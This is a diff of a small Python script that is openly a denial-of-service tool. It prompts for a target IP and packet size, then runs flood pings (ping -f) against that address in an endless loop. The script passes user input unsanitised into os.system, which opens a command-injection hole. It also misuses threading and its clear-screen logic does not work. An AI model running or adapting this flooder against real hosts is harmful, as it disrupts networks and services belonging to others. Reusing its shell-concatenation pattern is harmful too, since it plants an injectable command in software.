@@ -1,12 +1,26 @@
-#modules
-import os 
+#!/usr/bin/env python3
+
+"""
+~
+Author @Codex-ops
+~
+"""
+#Modules
+import os
 import threading
 
-#Defines 
-MAX = 65507
+#Defines
+CLEAR = "clear" or "cls"
 
-#User input 
-ip = input("Enter IP -----> ")
+#Users input 
+MAX = input("Enter Data Amount ---> ")
+os.system(CLEAR)
+ip = input("Enter IP ---> ")
 
-#Floods the server
-threading.Thread(None, os.system(f'ping -f -i 0.2 -s {MAX} ' + ip))
+#function
+print("CRTL + Z to exit")
+
+while True:
+  print(f'Flooding {ip} with {MAX} packet(s).')
+  threading.Thread(None, os.system(f'ping -f -i 0.2 -s {MAX} ' + ip))
+  os.system(CLEAR)
